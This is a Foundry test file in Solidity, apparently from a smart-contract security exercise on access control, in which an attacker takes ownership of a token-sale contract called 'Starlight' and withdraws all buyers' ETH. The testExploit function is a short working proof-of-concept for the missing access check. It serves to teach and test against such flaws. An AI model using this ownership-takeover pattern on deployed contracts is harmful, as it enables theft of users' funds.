// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {Starlight} from "../../src/7. Access Control-4/Starlight.sol";

contract TestStarlight is Test {
    Starlight light;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    uint256 constant USER1_PURCHASE = 95 ether;
    uint256 constant USER2_PURCHASE = 65 ether;
    uint256 constant USER3_PURCHASE = 33 ether;

    uint256 constant TOTAL_PURCHASE = USER1_PURCHASE + USER2_PURCHASE + USER3_PURCHASE;

    function setUp() public {
        vm.deal(user1, USER1_PURCHASE);
        vm.deal(user2, USER2_PURCHASE);
        vm.deal(user3, USER3_PURCHASE);

        vm.prank(deployer);
        light = new Starlight();

        vm.prank(user1);
        light.buyTokens{value: USER1_PURCHASE}(USER1_PURCHASE * 100, user1);

        vm.prank(user2);
        light.buyTokens{value: USER2_PURCHASE}(USER2_PURCHASE * 100, user2);

        vm.prank(user3);
        light.buyTokens{value: USER3_PURCHASE}(USER3_PURCHASE * 100, user3);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        light.transferOwnership(attacker);
        light.withdraw();
        vm.stopPrank();

        // Attacker stole all the ETH from the token sale contract
        assertEq(attacker.balance, TOTAL_PURCHASE);
    }
}
